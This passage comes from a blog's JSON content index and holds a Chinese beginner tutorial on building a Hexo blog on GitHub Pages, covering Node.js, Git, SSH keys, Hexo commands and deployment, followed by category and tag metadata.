1.安装node!!!1.在百度搜索Node.js,去官网下载最新稳定版本！下载的过程有点慢，不要着急。2.下载并且安装后，打开CMD命令行，输入node-v，会显示出你安装的版本信息，并且你知道你安装成功了！在这里我建议你们都输入一下试试，我就是没有试试，到搭建后期才发现node安装失败了！！！!2.GitHub的注册（这个过程没有什么困难就一笔代过了，不过说这个官网超级慢，慢慢来就行了）3.git for Windows的安装！百度搜索并且安装就完事了!4.配置GitHub SSH！1.在你git for windows 的安装路径下的文件夹内找到 git-bash.exe，运行。2.输入ssh-keygen -t rsa -C “自己的邮箱”，会生成一段密钥，及密钥所在路径。在.ssh中id-rsa的文件内用记事本打开，复制下来。3.登录你的GitHub，进入设置，找到SSH keys。把刚刚复制的密钥粘贴下来，就行了。5.hexo的安装及使用。1.在D盘内创建一个新文件夹(我的是blog)，以便于后边的hexo的本地安装。2.打开cmd命令行，cd blog回车,然后输入官网安装命令，安装过程有点超级慢，如果不行的话使用npm install -g cnpm –registry=https://registry.npm.taobao.org，这个会提高下载速度。3.按照官网的使用命令教程一步步进行。4.安装好后本地运行，local host：5555，就可以看到自己的博客了。（是不是很激动）6.安装sublime text。1.安装后直接打开，并将自己的博客目录拖进sublime text。2.自己博客目录里的source文件夹post文件夹是以后我们发布博客要用的，themes文件夹是我们更换主题要用的。注意：sublime text中更改文件时要记住冒号后面要加上一个空格，才能输入你要更改的内容。否则会出现如下的错误。7.hexo发布前的准备。1.去hexo官网安装插件，否则会报错哟。安装成功的标志。2.config.yml中的url更改为自己的博客站点，还有作者的名字。3.最后面的配置也不能忘！注意：（repo：自己的GitHub博客仓库地址）4.然后先hexo g生成，再hexo d再提交，并配置博客信息。5.输入成功后会让你登录GitHub的博客。 自此博客创建成功了！！！开心呀。","categories":[],"tags":[]}],"categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"生活","slug":"生活","permalink":"https://qidian-png.github.io/categories/%E7%94%9F%E6%B4%BB/"}],"tags":[{"name":"php学习","slug":"php学习","permalink":"https://qidian-png.github.io/tags/php%E5%AD%A6%E4%B9%A0/"},{"name":"Crypto学习","slug":"Crypto学习","permalink":"https://qidian-png.github.io/tags/Crypto%E5%AD%A6%E4%B9%A0/"},{"name":"web学习","slug":"web学习","permalink":"https://qidian-png.github.io/tags/web%E5%AD%A6%E4%B9%A0/"},{"name":"文件上传","slug":"文件上传","permalink":"https://qidian-png.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"Misc学习","slug":"Misc学习","permalink":"https://qidian-png.github.io/tags/Misc%E5%AD%A6%E4%B9%A0/"},{"name":"琐事","slug":"琐事","permalink":"https://qidian-png.github.io/tags/%E7%90%90%E4%BA%8B/"},{"name":"c++学习","slug":"c-学习","permalink":"https://qidian-png.github.io/tags/c-%E5%AD%A6%E4%B9%A0/"},{"name":"web","slug":"web","permalink":"https://qidian-png.github.io/tags/web/"},{"name":"kail","slug":"kail","permalink":"https://qidian-png.github.io/tags/kail/"},{"name":"zip知识学习","slug":"zip知识学习","permalink":"https://qidian-png.github.io/tags/zip%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/"},{"name":"靶场","slug":"靶场","permalink":"https://qidian-png.github.io/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"SQL注入","slug":"SQL注入","permalink":"https://qidian-png.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"其他","slug":"其他","permalink":"https://qidian-png.github.io/tags/%E5%85%B6%E4%BB%96/"}]}